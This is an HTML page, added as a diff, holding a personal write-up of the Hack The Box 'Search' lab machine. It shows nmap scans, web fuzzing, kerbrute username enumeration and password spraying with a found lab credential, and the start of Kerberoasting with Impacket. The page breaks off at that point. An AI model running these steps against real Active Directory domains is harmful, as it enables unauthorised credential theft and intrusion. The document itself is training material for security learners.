@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Search :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Steps done:
+ find creds and user on website used creds to authenticate to kerberos  Kerberoasted and cracked password from TGS   Logged into SMB Logged into LDAP  Todo:
+ Try to authenticate to RPC with RPC Client Enumerate LDAP or SMB for some useful information or creds use any creds found to authenticate to other areas or more kerberoasting or to login to certsrv endpoint Download and use cert to access /staff endpoint or 8172 port, or research." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/search/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Search :: Research blog">
+<meta property="og:description" content="Hack The Box machine" />
+<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/search/" />
+<meta property="og:site_name" content="Search" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/hackthebox/search/">Search</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-09 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Search" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h3 id="steps">Steps<a href="#steps" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>done:</p>
+<ol>
+<li>find creds and user on website</li>
+<li>used creds to authenticate to kerberos
+<ol>
+<li>Kerberoasted and cracked password from TGS</li>
+</ol>
+</li>
+<li>Logged into SMB</li>
+<li>Logged into LDAP</li>
+</ol>
+<p>Todo:</p>
+<ol>
+<li><strong>Try to authenticate to RPC with RPC Client</strong></li>
+<li>Enumerate LDAP or SMB for some useful information or creds</li>
+<li>use any creds found to authenticate to other areas or more kerberoasting or to login to certsrv endpoint</li>
+<li>Download and use cert to access /staff endpoint or 8172 port, or research.search.htb</li>
+<li>From here get some more information or shell</li>
+<li>Bloodhound
+<ol>
+<li>Outline attack vectors/ paths</li>
+</ol>
+</li>
+<li>privilege escalate and move laterally</li>
+<li>root</li>
+</ol>
+<h1 id="kerberos-information">Kerberos information<a href="#kerberos-information" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>KDC (Key Distribution Centre) - Responsible for authenticating and distributing tickets. In AC Environments the KDC is installed on the Domain Controller (DC)</p>
+<p>SPN (Service Principal Name) - This is the name of the service, sometimes you may have a user account with the SPN attribute configured which defines it as a service account. An example of a SPN would be.</p>
+<blockquote>
+<p>CIFS/SERVERNAME-2016RDS.m0chanAD.local
+MSSQL/MSSQLSERVER.m0chanAD.local</p>
+</blockquote>
+<h2 id="ticketing-information">Ticketing information<a href="#ticketing-information" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Ticket Terminologies:</p>
+<ul>
+<li>Ticket Granting Ticket (TGT) - This is a ticket assigned on a per-user basis that each user uses to authenticate to the KDC (Key Distribution Centre) with and issues requests for TGS ticket aka Service Tickets</li>
+<li>Ticket Granting Server (TGS) - A authentication subset of the KDC that issues Service Tickets after verifying an end user’s TGT and if they have access to the requested resource.</li>
+<li>Service Ticket (ST) - This is a ticket granted to you by the **TGS **for authentication purposes against services.</li>
+</ul>
+<h2 id="ticketing-steps">Ticketing steps<a href="#ticketing-steps" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ol>
+<li>User authenticates to KDC and is assigned a TGT</li>
+<li>User uses TGT to receive a TGS</li>
+<li>User uses TGS to receive a ST</li>
+<li>User uses ST for accessing resources</li>
+</ol>
+<h3 id="impacket-tooling">Impacket tooling<a href="#impacket-tooling" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ul>
+<li>GetNPUsers.py</li>
+</ul>
+<blockquote>
+<p>ASREProasting</p>
+</blockquote>
+<ul>
+<li>GetUsersSPNs.py</li>
+</ul>
+<blockquote>
+<p>Kerberoasting.</p>
+</blockquote>
+<p>Output:
+- Provides a TGS ticket you can pass into hashcat to crack to grab the password of the users account.</p>
+<h1 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ nmap 10.10.11.129 -oN nmap.txt
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-01-07 08:23 EST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.129
+Host is up <span style="color:#f92672">(</span>0.029s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">987</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ nmap -p- -A -sV 10.10.11.129 -oN nmapALL.txt
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: Search &amp;mdash; Just Testing IIS
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2022-01-07 13:43:01Z<span style="color:#f92672">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>research
+443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>research
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+|_ssl-date: 2022-01-07T13:44:35+00:00; +16m41s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: 
+8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+
+|_Not valid after:  2030-04-05T09:05:25
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49691/tcp open  msrpc         Microsoft Windows RPC
+49702/tcp open  msrpc         Microsoft Windows RPC
+49725/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2022-01-07T13:43:53
+|_  start_date: N/A
+|_clock-skew: mean: 16m40s, deviation: 0s, median: 16m40s
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+
+
+</code></pre></div><h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><strong>Domain controller</strong>
+<code>search.htb0</code></p>
+<p><strong>Domain name</strong>
+<code>search.htb</code></p>
+<p><strong>Service name</strong>
+<code>search.htb:research$@SEARCH.HTB</code></p>
+<p><strong>IIS Version</strong>
+v10.0</p>
+<p><strong>Usernames</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Keely Lyons</td>
+<td></td>
+</tr>
+<tr>
+<td>Dax Santiago</td>
+<td></td>
+</tr>
+<tr>
+<td>Sierra Frye</td>
+<td></td>
+</tr>
+<tr>
+<td>Kyla Stewart</td>
+<td></td>
+</tr>
+<tr>
+<td>Kaiara Spencer</td>
+<td></td>
+</tr>
+<tr>
+<td>Dave Simpson</td>
+<td></td>
+</tr>
+<tr>
+<td>Ben Thompson</td>
+<td></td>
+</tr>
+<tr>
+<td>Chris Stewart</td>
+<td></td>
+</tr>
+<tr>
+<td>Hope.Sharp</td>
+<td>IsolationIsKey? @3ONEmillionbaby</td>
+</tr>
+</tbody>
+</table>
+<p>Looks as though the target is running Active directory, with kerberos, ldap and SMBv2 running</p>
+<h2 id="kerberos-user-enumeration">Kerberos User enumeration<a href="#kerberos-user-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search/nullinux<span style="color:#f92672">]</span>
+└─$ nmap -p <span style="color:#ae81ff">88</span> --script krb5-enum-users 10.10.11.129 --script-args krb5-enum-users.realm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;search.htb&#39;</span> 
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-01-07 09:23 EST
+Nmap scan report <span style="color:#66d9ef">for</span> search.htb <span style="color:#f92672">(</span>10.10.11.129<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.021s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE
+88/tcp open  kerberos-sec
+| krb5-enum-users: 
+| Discovered Kerberos principals
+|_    administrator@search.htb
+</code></pre></div><h1 id="fuzz">Fuzz<a href="#fuzz" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ cat dirs.txt                      
+images                  <span style="color:#f92672">[</span>Status: 301, Size: 150, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+js                      <span style="color:#f92672">[</span>Status: 301, Size: 146, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+css                     <span style="color:#f92672">[</span>Status: 301, Size: 147, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+Images                  <span style="color:#f92672">[</span>Status: 301, Size: 150, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+fonts                   <span style="color:#f92672">[</span>Status: 301, Size: 149, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+.                       <span style="color:#f92672">[</span>Status: 200, Size: 44982, Words: 13260, Lines: 1030<span style="color:#f92672">]</span>
+CSS                     <span style="color:#f92672">[</span>Status: 301, Size: 147, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+JS                      <span style="color:#f92672">[</span>Status: 301, Size: 146, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+Css                     <span style="color:#f92672">[</span>Status: 301, Size: 147, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+Js                      <span style="color:#f92672">[</span>Status: 301, Size: 146, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+IMAGES                  <span style="color:#f92672">[</span>Status: 301, Size: 150, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+Fonts                   <span style="color:#f92672">[</span>Status: 301, Size: 149, Words: 9, Lines: 2<span style="color:#f92672">]</span>
+certsrv                 <span style="color:#f92672">[</span>Status: 401, Size: 1293, Words: 81, Lines: 30<span style="color:#f92672">]</span>
+</code></pre></div><p>Found a strange directory name with some web fuzzing</p>
+<p><img src="/images/hiddensecrets.png" alt="hiddensecrets"></p>
+<p>Brings me to a login page. Looks like this <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)">Certification Authority Web Enrollment Guidance | Microsoft Docs</a></p>
+<h1 id="rpcclient">RPCclient<a href="#rpcclient" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>RPC Client anonymous login</p>
+<p>But like no privileges</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>               
+└─$ rpcclient -U <span style="color:#e6db74">&#34;&#34;</span> -N 10.10.11.129
+rpcclient $&gt; getusername
+Account Name: ANONYMOUS LOGON, Authority Name: NT AUTHORITY
+rpcclient $&gt;
+
+
+--------------         ----------------------
+      LSARPC-DS
+  dsroledominfo         Get Primary Domain Information
+---------------         ----------------------
+         LSARPC
+       lsaquery         Query info policy
+     lookupsids         Convert SIDs to names
+    lookupsids3         Convert SIDs to names
+lookupsids_level                Convert SIDs to names
+    lookupnames         Convert names to SIDs
+   lookupnames4         Convert names to SIDs
+lookupnames_level               Convert names to SIDs
+      enumtrust         Enumerate trusted domains
+      enumprivs         Enumerate privileges
+    getdispname         Get the privilege name
+     lsaenumsid         Enumerate the LSA SIDS
+lsacreateaccount                Create a new lsa account
+lsaenumprivsaccount             Enumerate the privileges of an SID
+lsaenumacctrights               Enumerate the rights of an SID
+     lsaaddpriv         Assign a privilege to a SID
+     lsadelpriv         Revoke a privilege from a SID
+lsaaddacctrights                Add rights to an account
+lsaremoveacctrights             Remove rights from an account
+lsalookupprivvalue              Get a privilege value given its name
+ lsaquerysecobj         Query LSA security object
+lsaquerytrustdominfo            Query LSA trusted domains info <span style="color:#f92672">(</span>given a SID<span style="color:#f92672">)</span>
+lsaquerytrustdominfobyname              Query LSA trusted domains info <span style="color:#f92672">(</span>given a name<span style="color:#f92672">)</span>, only works <span style="color:#66d9ef">for</span> Windows &gt; 2k
+lsaquerytrustdominfobysid               Query LSA trusted domains info <span style="color:#f92672">(</span>given a SID<span style="color:#f92672">)</span>
+lsasettrustdominfo              Set LSA trusted domain info
+    getusername         Get username
+   createsecret         Create Secret
+   deletesecret         Delete Secret
+    querysecret         Query Secret
+      setsecret         Set Secret
+retrieveprivatedata             Retrieve Private Data
+storeprivatedata                Store Private Data
+ createtrustdom         Create Trusted Domain
+ deletetrustdom         Delete Trusted Domain
+
+</code></pre></div><h1 id="username-enumeration">Username Enumeration<a href="#username-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Generate some usernames from the list of users we found earlier</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ cat users.txt
+Dax
+Sierra
+Kyla
+Kaiara
+Dave
+Ben
+Chris
+Keely.Lyons
+Dax.Santiago
+Sierra.Frye
+Kyla.Stewart
+Kaiara.Spencer
+Dave.Simpson
+Ben.Thompson
+Chris.Stewart
+Keely
+Dax
+Sierra
+Kyla
+Kaiara
+Dave
+Ben
+Chris
+KLyons
+DSantiago
+SFrye
+KStewart
+KSpencer
+DSimpson
+BThompson
+CStewart
+Lyons
+Santiago
+Frye
+Stewart
+Spencer
+Simpson
+Thompson
+Stewart
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ kerbrute userenum -d search.htb --dc 10.10.11.129 users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
+
+Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 05/02/22 - Ronnie Flathers @ropnop
+
+2022/05/02 19:43:57 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+2022/05/02 19:43:57 &gt;   10.10.11.129:88
+
+2022/05/02 19:43:58 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Sierra.Frye@search.htb
+2022/05/02 19:43:58 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Dax.Santiago@search.htb
+2022/05/02 19:43:58 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Keely.Lyons@search.htb
+2022/05/02 19:43:58 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       administrator@search.htb
+2022/05/02 19:43:58 &gt;  Done! Tested <span style="color:#ae81ff">38</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> valid<span style="color:#f92672">)</span> in 0.538 seconds
+</code></pre></div><p>If this doesn&rsquo;t work, check your date is in sync with the dc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>                                                         
+└─$ ntpdate -q 10.10.11.129
+2022-05-02 19:33:30.758854 <span style="color:#f92672">(</span>+0100<span style="color:#f92672">)</span> +0.349340 +/- 0.019086 10.10.11.129 s1 no-leap
+</code></pre></div><p>Sync date</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ sudo ntpdate 10.10.11.129                                                           
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2022-05-02T19:42:45.777915+0100&#34;</span>,<span style="color:#e6db74">&#34;offset&#34;</span>:0.001920,<span style="color:#e6db74">&#34;precision&#34;</span>:0.328186,<span style="color:#e6db74">&#34;host&#34;</span>:<span style="color:#e6db74">&#34;10.10.11.129&#34;</span>,<span style="color:#e6db74">&#34;ip&#34;</span>:<span style="color:#e6db74">&#34;10.10.11.129&#34;</span>,<span style="color:#e6db74">&#34;stratum&#34;</span>:1,<span style="color:#e6db74">&#34;leap&#34;</span>:<span style="color:#e6db74">&#34;no-leap&#34;</span>,<span style="color:#e6db74">&#34;adjusted&#34;</span>:false<span style="color:#f92672">}</span>
+</code></pre></div><h1 id="username-found">Username found<a href="#username-found" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Looking at one of the images on the webpage we found a new user and a potential username
+![[Screenshot 2022-05-02 at 20.19.51.png]]</p>
+<h2 id="confirm-user-is-real-user">Confirm user is real user<a href="#confirm-user-is-real-user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>                                                         
+└─$ kerbrute userenum -d search.htb --dc 10.10.11.129 actualUsers.txt                                  
+                                                                                                       
+    __             __               __                                                                 
+   / /_____  _____/ /_  _______  __/ /____                                                             
+  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\ </span>                                                           
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/                                                            
+/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                                             
+                                                                                                       
+Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 05/02/22 - Ronnie Flathers @ropnop                                         
+                                                                                                       
+2022/05/02 20:24:29 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:                                                                   
+2022/05/02 20:24:29 &gt;   10.10.11.129:88                                                                
+                                                                                                       
+2022/05/02 20:24:29 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Keely.Lyons@search.htb                                
+2022/05/02 20:24:29 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Hope.Sharp@search.htb                                 
+2022/05/02 20:24:29 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Dax.Santiago@search.htb                               
+2022/05/02 20:24:29 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Sierra.Frye@search.htb                                
+2022/05/02 20:24:29 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       administrator@search.htb                              
+2022/05/02 20:24:29 &gt;  Done! Tested <span style="color:#ae81ff">5</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">5</span> valid<span style="color:#f92672">)</span> in 0.072 seconds                             
+</code></pre></div><h2 id="spray-password">Spray password<a href="#spray-password" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>                                                         
+└─$ kerbrute passwordspray -d search.htb --dc 10.10.11.129 actualUsers.txt IsolationIsKey?             
+                                                                                                       
+    __             __               __                                                                 
+   / /_____  _____/ /_  _______  __/ /____                                                             
+  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\ </span>                                                           
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/                                                            
+/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                                             
+                                                                                                       
+Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 05/02/22 - Ronnie Flathers @ropnop                                         
+
+2022/05/02 20:24:41 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+2022/05/02 20:24:41 &gt;   10.10.11.129:88
+
+2022/05/02 20:24:42 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID LOGIN:  Hope.Sharp@search.htb:IsolationIsKey?
+2022/05/02 20:24:42 &gt;  Done! Tested <span style="color:#ae81ff">5</span> logins <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> successes<span style="color:#f92672">)</span> in 0.589 seconds
+</code></pre></div><h1 id="kerberoast">Kerberoast<a href="#kerberoast" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ python3 /opt/impacket-0.9.23/examples/GetUserSPNs.py search.htb/Hope.Sharp:IsolationIsKey? -dc-ip 10.10.11.129 -outputfile hashes.kerberoast
+Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
+
+ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
+---------------------------------  -------  --------  --------------------------  ---------  ----------
+RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 13:59:11.329031  &lt;never&gt;               
+                                                      
+┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ cat hashes.kerberoast                                                                      <span style="color:#ae81ff">1</span> ⨯ <span style="color:#ae81ff">1</span> ⚙
